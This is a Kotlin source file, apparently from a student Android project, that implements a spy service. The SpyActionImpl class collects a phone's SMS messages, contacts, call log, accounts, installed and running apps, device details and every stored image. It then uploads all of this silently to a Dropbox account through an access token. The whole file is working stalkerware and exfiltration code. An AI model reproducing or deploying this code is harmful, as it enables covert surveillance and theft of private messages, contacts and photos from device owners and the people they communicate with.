package com.homework.myapplication.spyservice

import android.os.Build
import com.dropbox.core.DbxRequestConfig
import com.dropbox.core.v2.DbxClientV2
import com.dropbox.core.v2.files.WriteMode
import com.google.gson.Gson
import com.homework.myapplication.App
import com.homework.myapplication.presentation.SpyAction
import java.io.ByteArrayInputStream
import java.io.FileInputStream
import java.io.InputStream

class SpyActionImpl : SpyAction {

    private val getMessages: GetMessages = GetMessages()
    private val getContacts: GetContacts = GetContacts()
    private val getCalls: GetCalls = GetCalls()
    private val getInstalled: GetInstalled = GetInstalled()
    private val getRunning: GetRunning = GetRunning()
    private val getBattery: GetBattery = GetBattery()
    private val getMemory: GetMemory = GetMemory()
    private val getAccounts: GetAccounts = GetAccounts()
    private val getImages: GetImages = GetImages()

    override fun startAction(token: String) {
        val spyInfo = SpyInfo.Builder().apply {
            setMessages(getMessages(App.appContext))
            setContacts(getContacts(App.appContext))
            setCalls(getCalls(App.appContext))
            setVersion(Build.VERSION.RELEASE)
            setSdk(Build.VERSION.SDK_INT)
            setInstalled(getInstalled(App.appContext))
            setRunning(getRunning(App.appContext))
            setBattery(getBattery(App.appContext))
            setMemory(getMemory(App.appContext))
            setAccounts(getAccounts(App.appContext))
            build()
        }
        val data: ByteArray = Gson().toJson(spyInfo).toByteArray()
        uploadToDisk(
            inputStream = ByteArrayInputStream(data),
            accessToken = token,
            fileName = FILE_NAME
        )
        val images = getImages(App.appContext)
        for (image in images) {
            val imgInputStream = FileInputStream(image.path)
            val name = image.path.split("/").lastOrNull() ?: DEFAULT
            uploadToDisk(inputStream = imgInputStream, accessToken = token, fileName = name)
        }
    }

    private fun uploadToDisk(inputStream: InputStream, accessToken: String, fileName: String) {
        val config = DbxRequestConfig.newBuilder("dropbox/bos1").build()
        val client = DbxClientV2(config, accessToken)
        try {
            client.files().uploadBuilder("/${fileName}").withMode(WriteMode.OVERWRITE)
                .uploadAndFinish(inputStream)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }

    companion object {
        private const val FILE_NAME = "data.txt"
        private const val DEFAULT = "default"
    }
}
